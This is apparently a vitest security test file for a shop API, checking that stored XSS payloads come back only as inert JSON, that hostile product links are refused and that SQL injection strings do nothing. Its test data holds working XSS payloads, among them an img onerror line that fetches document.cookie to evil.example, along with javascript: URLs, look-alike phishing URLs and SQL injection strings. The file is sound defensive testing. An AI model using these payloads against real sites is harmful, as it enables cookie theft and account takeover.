// SEC-004: stored XSS at the API level. Hostile text is stored and returned
// verbatim as JSON (application/json + nosniff), never as HTML, and the
// production HTML shell never reflects it.
import request from 'supertest';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { CSRF, PNG_BYTES, hasBuiltUi, makeSecApp, productInput, type SecApp } from './fullstack';

const SCRIPT = '<script>alert(document.cookie)</script>';
const IMG = '<img src=x onerror="fetch(`//evil.example/?c=`+document.cookie)">';
const SVG = '<svg/onload=alert(1)>';
const BREAKOUT = '"></title></script><script>alert(2)</script>';

describe('SEC-004 stored XSS payloads through the real API', () => {
  let t: SecApp;
  let admin: Awaited<ReturnType<SecApp['login']>>;
  let slug: string;
  let productId: number;

  beforeAll(async () => {
    t = await makeSecApp();
    admin = await t.login();
    const cat = await admin.post('/api/admin/categories').set(CSRF).send({ name: `Cat ${SVG}` });
    expect(cat.status).toBe(201);
    const created = await admin
      .post('/api/admin/products')
      .set(CSRF)
      .send(
        productInput({
          name: `Tee ${SCRIPT}`,
          description: `${IMG}\n${BREAKOUT}\n${SCRIPT}`,
          colours: [{ name: `Red ${SVG}`, hex: '#FF0000' }],
          categoryId: cat.body.id,
        }),
      );
    expect(created.status).toBe(201);
    slug = created.body.slug;
    productId = created.body.id;
    const img = await admin
      .post(`/api/admin/products/${productId}/images`)
      .set(CSRF)
      .field('alt', `Alt ${IMG}`)
      .attach('image', PNG_BYTES, 'a.png');
    expect(img.status).toBe(201);
  });
  afterAll(() => t.cleanup());

  it('the generated slug contains none of the markup', () => {
    expect(slug).toMatch(/^[a-z0-9]+(?:-[a-z0-9]+)*$/);
  });

  it('public product JSON returns the text verbatim, as JSON, with nosniff', async () => {
    const res = await request(t.app).get(`/api/products/${slug}`);
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toMatch(/^application\/json; charset=utf-8$/);
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['content-security-policy']).toContain("script-src 'self'");
    // Stored as plain text: not stripped, not double-encoded, not turned into HTML entities.
    expect(res.body.name).toBe(`Tee ${SCRIPT}`);
    expect(res.body.description).toBe(`${IMG}\n${BREAKOUT}\n${SCRIPT}`);
    expect(res.body.colours[0].name).toBe(`Red ${SVG}`);
    expect(res.body.category.name).toBe(`Cat ${SVG}`);
    expect(res.body.images[0].alt).toBe(`Alt ${IMG}`);
    // The body is a JSON document: the payload only ever appears inside a JSON string literal.
    expect(res.text.startsWith('{')).toBe(true);
    expect(() => JSON.parse(res.text)).not.toThrow();
    expect(res.text).toContain(JSON.stringify(`Tee ${SCRIPT}`));
  });

  it('list and admin endpoints are JSON too', async () => {
    for (const url of ['/api/products', '/api/categories']) {
      const res = await request(t.app).get(url);
      expect(res.headers['content-type'], url).toMatch(/^application\/json/);
      expect(res.headers['x-content-type-options']).toBe('nosniff');
    }
    const adminRes = await admin.get(`/api/admin/products/${productId}`);
    expect(adminRes.headers['content-type']).toMatch(/^application\/json/);
    expect(adminRes.body.name).toBe(`Tee ${SCRIPT}`);
  });

  it('error responses never echo the payload back as HTML', async () => {
    const res = await request(t.app).get(`/api/products/${encodeURIComponent(SCRIPT)}`);
    expect(res.status).toBe(404);
    expect(res.headers['content-type']).toMatch(/^application\/json/);
    expect(res.text).not.toContain('<script>');

    const bad = await admin
      .post('/api/admin/products')
      .set(CSRF)
      .send({ ...productInput(), [SCRIPT]: 1 });
    expect(bad.status).toBe(400);
    expect(bad.headers['content-type']).toMatch(/^application\/json/);
  });

  it('a javascript:, data: or look-alike amazonUrl is refused on create and on update', async () => {
    const hostile = [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'http://www.amazon.com.au/dp/B000',
      'https://www.amazon.com.au.evil.example/dp/B000',
      'https://amazon.com.au@evil.example/',
      'https://evil.example/https://www.amazon.com.au/',
      ' javascript:alert(1)',
    ];
    for (const amazonUrl of hostile) {
      const create = await admin.post('/api/admin/products').set(CSRF).send(productInput({ name: 'Bad Link', amazonUrl }));
      expect(create.status, amazonUrl).toBe(400);
      expect(create.body.error.details.map((d: { field: string }) => d.field)).toContain('amazonUrl');
      const update = await admin.put(`/api/admin/products/${productId}`).set(CSRF).send(productInput({ amazonUrl }));
      expect(update.status, amazonUrl).toBe(400);
    }
    expect(t.repos.products.getById(productId)?.amazonUrl).toBe('https://www.amazon.com.au/dp/B000SECREV');
  });

  it('SQL metacharacters in the slug and category filter are inert', async () => {
    const all = (await request(t.app).get('/api/products')).body.items.length;
    expect(all).toBeGreaterThan(0);
    const inj = await request(t.app).get('/api/products').query({ category: "' OR 1=1 --" });
    expect(inj.status).toBe(200);
    expect(inj.body.items).toEqual([]);
    const bySlug = await request(t.app).get(`/api/products/${encodeURIComponent("x' OR '1'='1")}`);
    expect(bySlug.status).toBe(404);
  });

  it.skipIf(!hasBuiltUi)('the production HTML shell is static and never reflects stored data', async () => {
    const prod = await makeSecApp({ isProduction: true });
    try {
      const a = await prod.login();
      const created = await a.post('/api/admin/products').set(CSRF).send(productInput({ name: `Tee ${SCRIPT}` }));
      const res = await request(prod.app).get(`/shirts/${created.body.slug}`);
      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toMatch(/^text\/html/);
      expect(res.text).not.toContain('alert(document.cookie)');
      const reflected = await request(prod.app).get(`/shop?category=${encodeURIComponent(SCRIPT)}`);
      expect(reflected.text).not.toContain('alert(document.cookie)');
    } finally {
      prod.cleanup();
    }
  });
});
